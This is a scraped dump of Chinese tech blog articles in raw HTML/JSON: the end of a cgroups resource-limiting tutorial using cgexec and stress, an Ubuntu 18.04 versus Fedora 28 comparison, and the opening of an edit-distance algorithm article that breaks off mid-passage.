class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ./mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f09103486706-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f09103486706-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n\n</div>\n<p>此时一切顺利，然后加上刚才的约束试试：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f0c379222806\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cgexec -g memory:nick_memory ./mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f0c379222806-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f0c379222806-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgexec</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">memory</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">nick</span><span class=\"crayon-sy\">_</span>memory<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/126adb43052fdb222b267ee9f5220532.png\" alt=\"\"></p>\n<p>由于内存不足且禁止使用 swap，所以被限制资源的进程在申请内存时被强制杀死了。</p>\n<p>下面再使用 stress 程序测试一个类似的场景(通过 stress 程序申请 500M 的内存)：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f0f892388921\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo cgexec -g memory:nick_memory stress --vm 1 --vm-bytes 500000000 --vm-keep --verbose</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f0f892388921-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f0f892388921-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">cgexec</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">memory</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">nick_memory </span><span class=\"crayon-v\">stress</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">vm</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">500000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">keep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">verbose</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n\n</div>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/4ab4a591c7d0cb6d37015aa493d0a61b.png\" alt=\"\"></p>\n<p>stress 程序能够提供比较详细的信息，进程被杀掉的方式是收到了 SIGKILL(signal 9) 信号。</p>\n<p>实际应用中往往要同时限制多种的资源，比如既限制 CPU 资源又限制内存资源。使用 cgexec 实现这样的用例其实很简单，直接指定多个 -g 选项就可以了：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f13763351370\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cgexec -g cpu:nick_cpu -g memory:nick_memory ./cpumem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f13763351370-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f13763351370-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cgexec</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">nick_cpu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">memory</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">nick</span><span class=\"crayon-sy\">_</span>memory<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cpumem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n\n</div>\n<h1>总结</h1>\n<p>cgroups 是 linux 内核提供的功能，由于牵涉的概念比较多，所以不太容易理解。本文试图在介绍概念性内容的同时，用最简单的 demo 演示 cgroups 的用法。希望直观的 demo 能够帮助大家理解 cgroups。</p>\n<p><strong>参考：</strong></p>\n<p><a href=\"http://wsfdl.com/linux/2015/05/21/%E7%90%86%E8%A7%A3control_group.html\" target=\"_blank\">Linux Control Group 简介</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114311\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114311votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114311\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "对比 Ubuntu 18.04 和 Fedora 28", "url": "http://blog.jobbole.com/114327/", "create_date": "2018/08/27", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ddb1f665d74f913109feb4dfead998f1.jpg"], "url_object_id": "17a23b37f11df2f0adf39d84080e0c43", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.linuxandubuntu.com/home/ubuntu-1804-vs-fedora-28\">Linuxandubuntu</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9952-1.html\">Linux中国/Andy Song</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ddb1f665d74f913109feb4dfead998f1.jpg\"></p>\n<p>大家好，我准备在今天突出说明一下两大主流 Linux 发行版，即 <strong>Ubuntu 18.04</strong> 和 <strong>Fedora 28</strong>，包括一些特性和差异。两者都有各自的包管理系统，其中 Ubuntu 使用 DEB，Fedora 使用 RPM；但二者使用同样的<a href=\"http://www.linuxandubuntu.com/home/5-best-linux-desktop-environments-with-pros-cons\">桌面环境Desktop Environment</a> （DE）<a href=\"http://www.linuxandubuntu.com/home/walkthrough-on-how-to-use-gnome-boxes\">GNOME</a>，并致力于为 Linux 用户提供高品质的桌面体验desktop experience。</p>\n<p><strong>Ubuntu 18.04</strong> 是 Ubuntu 目前最新的 <a href=\"http://www.linuxandubuntu.com/home/ubuntu-1804-codename-announced-bionic-beaver\">长期支持版本Long Term Support</a>（LTS），为用户提供 GNOME 桌面系统。<strong>Fedora 28</strong> 也提供 GNOME 桌面系统，但落实到具体的软件包管理方面，二者的桌面体验存在差异；在用户界面User Interfaces方面也显然存在差异。</p>\n<h3 id=\"toc_1\">基本概念</h3>\n<p>不知你是否了解，虽然 Ubuntu 基于 Debian，但 Ubuntu 比 Debian 更早提供最新版本的软件。举个例子，当 Ubuntu 提供流行网页浏览器 Firefox Quantum 时，Debian 仍在提供 Firefox 的延期支持版Extended Support Release（ESR）。</p>\n<p>（LCTT 译注：从 2012 年 1 月开始，Firefox 进入快速版本期，每 6 周发布新的主线版本，每隔 7 个主线版本发布新的 ESR 版本。Firefox 57 的桌面版发布时被命名为 Firefox Quantum，同期的 ESR 版本与 Firefox 52 一同发布并基于 Firefox 48。参考 <a href=\"https://en.wikipedia.org/wiki/History_of_Firefox\">Wiki: History_of_Firefox</a>）</p>\n<p>同样的情况也适用于 Fedora，它为终端用户提供前沿的软件，也被用作下一个稳定版本的 RHEL (Red Hat Enterprise Linux) 的测试平台。</p>\n<h3 id=\"toc_2\">桌面预览</h3>\n<p>Fedora 提供原汁原味的vanilla GNOME 桌面体验；相比之下，Ubuntu 18.04 对 GNOME 做了若干方面的微调，以便长期以来的 Unity 用户可以平滑的过渡到 GNOME 桌面环境。</p>\n<p><em>为节省开发时间，Canonical （从 Ubuntu <a href=\"http://www.linuxandubuntu.com/home/what-new-is-going-to-be-in-ubuntu-1704-zesty-zapus\">17.10</a> 开始）已经决定放弃 Unity 并转向 GNOME 桌面，以便可以将更多精力投入到 IoT 领域。</em></p>\n<p>因此，在 Fedora 的桌面预览中，我们可以看到一个简洁的无图标桌面和一个自动隐藏的侧边栏，整体外观采用 GNOME 默认的 Adwaita 主题。</p>\n<p><a href=\"http://www.linuxandubuntu.com/uploads/2/1/1/5/21152474/ubuntu-18-04-gnome_orig.jpg\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/34ff23eea5a5293be2e1e3357157a3d9.jpg\" alt=\"fedora 28 gnome\"></a></p>\n<p>相比之下，Ubuntu 采用其经典的有图标桌面样式，左侧边栏用于模拟其传统的“程序坞dock”，使用 Ubuntu Ambiance 主题定制化窗口，与其传统的（Unity 桌面）外观和体验基本一致。</p>\n<p><a href=\"http://www.linuxandubuntu.com/uploads/2/1/1/5/21152474/ubuntu-gnome-18-04_orig.jpg\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/5e63dbae97afc66e955d1185c6f26ce7.jpg\" alt=\"Ubuntu gnome 18.04\"></a></p>\n<p>虽然存在一定差异，但习惯使用其中一种桌面环境后切换到另外一种并不困难。毕竟二者设计时都充分考虑了简洁性和用户友好性，即使是新用户也不会对这两种 Linux 发行版感到不适应。</p>\n<p>但外观或 UI 并不是决定用户选择哪一种 Linux 发行版的唯一因素，还有其它因素也会影响用户的选择。下面主要介绍两种 Linux 发行版在软件包管理相关方面的内容。</p>\n<h3 id=\"toc_3\">软件中心</h3>\n<p>Ubuntu 使用 dpkg（即 Debian Package Management）将软件分发给终端用户；Fedora 则使用 rpm（全称为 Red Hat Package Management）。它们都是 Linux 社区中非常流行的包管理系统，对应的命令行工具也都简单易用。</p>\n<p><a href=\"http://www.linuxandubuntu.com/uploads/2/1/1/5/21152474/ubuntu-software-center_2_orig.jpg\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/3390655eab10c9026788ce80d68f0e02.jpg\" alt=\"ubuntu software center\"></a></p>\n<p>但在具体分发的软件方面，各个 Linux 发行版会有明显差异。Canonical 每 6 个月发布新版本的 Ubuntu，一般是在每年的 4 月和 10 月。对每个版本，开发者会维护一个开发计划；Ubuntu 新版本发布后，该版本就会进入冻结freeze状态，即停止新软件的开发和测试。</p>\n<p>相比之下，Fedora 也采用相似的 6 个月发布周期，看起来很像一种滚动更新rolling release的 Linux 发行版（其实并不是这样）。与 Ubuntu 不同之处在于，（Fedora 中的）几乎所有软件包更新都很频繁，让用户有机会尝试最新版本的软件。但这样也导致软件 Bug 更频繁出现，给用户带来“不稳定性”，虽然还不至于导致系统不可用。</p>\n<h3 id=\"toc_4\">软件更新</h3>\n<p>我上面已经提到了 Ubuntu 版本的冻结状态。好吧，由于它对 Ubuntu 软件更新方式有着重要的影响，我再次提到这个状态：当 Ubuntu 新版本发布后，该版本的开发（这里是指测试新软件）就停止了。</p>\n<p><em>即将发布的下个版本的开发也随之开始，先后历经 “每日构建daily build” 和 “测试版beta release” 阶段，最后作为新版本发布给终端用户。</em></p>\n<p>在冻结状态下，Ubuntu 维护者不会在软件源package repository中增加最新版软件，除非用于解决严重的安全问题。因此，Ubuntu 用户可用的软件更新更多涉及 Bug 修复而不是新特性，这样的好处在于系统可以保持稳定，不会扰乱用户的使用。</p>\n<p>Fedora 试图为终端用户提供最新版本的软件，故用户的可用软件更新相比 Ubuntu 而言会更多涉及新特性。当然，开发者为了维持系统的稳定性，也采取了一系列措施。例如，在操作系统启动时，用户可以从最多三个可用内核working kernel（最新内核处于最上方）中进行选择；当新内核无法启动时，用户可以回滚使用之前两个可用内核。</p>\n<h3 id=\"toc_5\">Snaps 和 flatpak</h3>\n<p>它们都是新出现的酷炫工具，可以将软件发布到多个 Linux 发行版上。Ubuntu 提供 <strong>snaps</strong>，而 Fedora 则提供 <strong>flatpak</strong> 。二者之中 snaps 更加流行，更多流行软件或版权软件都在考虑上架 snap 商店。Flatpak 也在吸引关注，越来越多的软件上线该平台。</p>\n<p>不幸的是，由于二者出现的时间都不久，很多人遇到“窗口主题不一致window theme-breaking”问题并在网上表达不满。但由于二者都很易于使用，在二者之间切换并不是难事。</p>\n<p>（LCTT 译注：按译者理解，由于二者都增加了一层安全隔离，读取系统主题方面会遇到问题；另外，似乎也有反馈 snap 专用主题无法及时应用于 snap 的问题）</p>\n<h3 id=\"toc_6\">应用对比</h3>\n<p>下面列出一些在 Ubuntu 和 Fedora 上共有的常见应用，然后在两个平台之间进行对比：</p>\n<h4 id=\"toc_7\">计算器</h4>\n<p>Fedora 上的计算器程序启动速度更快。这是因为 Fedora 上的计算器程序是软件包形式安装的，而 Ubuntu 上的计算器程序则是 snap 版本。</p>\n<h4 id=\"toc_8\">系统监视器</h4>\n<p>可能听上去比较书呆子气，但我认为观察计算机性能并杀掉令人讨厌的进程是必要且直观的。程序启动速度对比与计算器的结果一致，即 （软件包方式安装的）Fedora 版本快于（snap 形式提供的）Ubuntu 版本。</p>\n<h4 id=\"toc_9\">帮助程序</h4>\n<p>我已经提到，（为便于长期以来的 Untiy 用户平滑切换到 GNOME），Ubuntu 提供的 GNOME 桌面环境是经过微调的版本。不幸的是，Ubuntu 开发者似乎忘记或忽略了对帮助程序的更新，用户阅读文档（入门视频）后会发现演示视频与真实环境有略微差异，这可能让人感到迷惑。</p>\n<p><a href=\"http://www.linuxandubuntu.com/uploads/2/1/1/5/21152474/ubuntu-18-04-help-manual_orig.jpg\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/cf301305235cc47e24ebcc91d2e12952.jpg\" alt=\"ubuntu 18.04 help manual\"></a></p>\n<h3 id=\"toc_10\">结论</h3>\n<p>Ubuntu 和 Fedora 是两个主流的 Linux 发行版。两者都各自有一些华而不实的特性，因而新接触 Linux 的人很难抉择。我的建议是同时尝试二者，这样你在试用后可以发现哪个发行版提供的工具更适合你。</p>\n<p>希望你阅读愉快，你可以在下方的评论区给出我漏掉的内容或你的建议。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114327\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114327votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114327\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/1868b505269cd1c49bd1048cb0b76b26116ba5c4.jpg"}
{"title": "死磕一周算法，我让服务性能提高50%", "url": "http://blog.jobbole.com/114324/", "create_date": "2018/08/27", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "url_object_id": "579796c6be8f558716fe854779320e88", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,性能", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/haolujun/p/9527776.html\">haolujun</a>   </div><h2 id=\"前言\">前言</h2>\n<p>我最近一直在公司做检索性能优化。当我看到这个算法之前，我也不认为我负责的检索系统性能还有改进的余地。但是这个算法确实太牛掰了，足足让服务性能提高50%，我不得不和大家分享一下。其实前一段时间的博客中也写到过这个算法，只是没有细讲，今天我准备把它单独拎出来，说道说道。说实话，本人数学功底一般，算法证明不是我强项，所以文中的证明只是我在论文作者的基础上加入了自己的思考方法，并且还没有完全证明出来，请大家见谅 ! 欢迎爱思考的小伙伴进行补充。我只要达到抛砖引玉的作用，就知足了。</p>\n<p>回归正题，我们的检索服务中用到了最小编辑距离算法，这个算法本身是平方量级的时间复杂度，并且很少人在帖子中提到小于这个复杂度的算法。但是我无意中发现了另外一个更牛的算法：列划分算法，使得这个本就很牛的算法性能直接提高一倍。接下来进入正题。</p>\n<h2 id=\"列划分算法\">列划分算法</h2>\n<p>这个算法比较难理解，出自如下论文：《Theoretical and empirical comparisons of approximate string matching algorithms》。In Proceedings of the 3rd Annual Symposium on Combinatorial Pattern Matching, number 664 in Lecture Notes in Computer Science, pages 175~184. Springer-Verlag, 1992。Author:WI Chang ，J Lampe。所以有必要先给大家普及一些共识。</p>\n<p><strong>编辑矩阵</strong> 最小编辑距离在计算过程中使用动态规划算法计算的那个矩阵，了解这个算法的都懂，我不赘述。但是我们的编辑矩阵有个特点：第一行都是0，这么做的好处是：只要文本串T中的任意一个子序列与模式串P的编辑距离小于某个固定的数值，就会被发现。</p>\n<p>给大伙一个样例，文本串T=annealing，模式串P=annual：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ed6cb9c9f4e2315c4c75bf405206ccda.png\"></p>\n<p>注意，第一行都是0，这是与传统最小编辑距离的最大区别，其余的动归方程完全相同。</p>\n<p><strong>对角线法则</strong> 编辑矩阵沿着右下方对角线方向数值非递减，并且至多相差1。</p>\n<p><strong>行列法则</strong> 每行每列相邻两个数至多相差1。</p>\n<p>观察编辑距离矩阵，我们发现如下事实：每一列是由若干段连续数字组成。所以我们把编辑矩阵的每一列划分成若干连续序列，如下图所示：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/72f5b31135a79ed08e87d6dcd3b48a4e.png\"></p>\n<p>红色框中就是一个一个的序列，序列内部连续。</p>\n<p><strong>序列-δ 定义</strong> 对于编辑矩阵的每一个元素D[j][i] (j是行，i是列)，若 j – D[j][i] = δ，我们就说D[j][i]属于i列上的 序列-δ，我们还观察到随着j增大，j – D[j][i]是非递减的。如下图所示：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/c95123bff6ecbcabdcf4a0f51eb03e5d.png\"></p>\n<p><strong>序列-δ终止位置</strong> 每个序列都会有起始和终止位置。序列-δ的终止位置为j，如果j是序列-δ的最小横坐标，并且满足D[j+1][i]属于序列-ε，并且ε&gt;δ（即j+1-D[j+1][i]&gt;δ）。</p>\n<p><strong>长度为0的序列</strong> 我们发现如果按照如上定义，每一列上δ的值并不一定连续，总是或有或无的缺少一个数值。所以我们定义长度为0的序列：当D[j+1][i] &lt; D[j][i]时，我们就在序列-δ和序列-(δ+2)之间人为插入一个长度为0的序列-(δ+1)。如下图所示：</p>\n<p><img 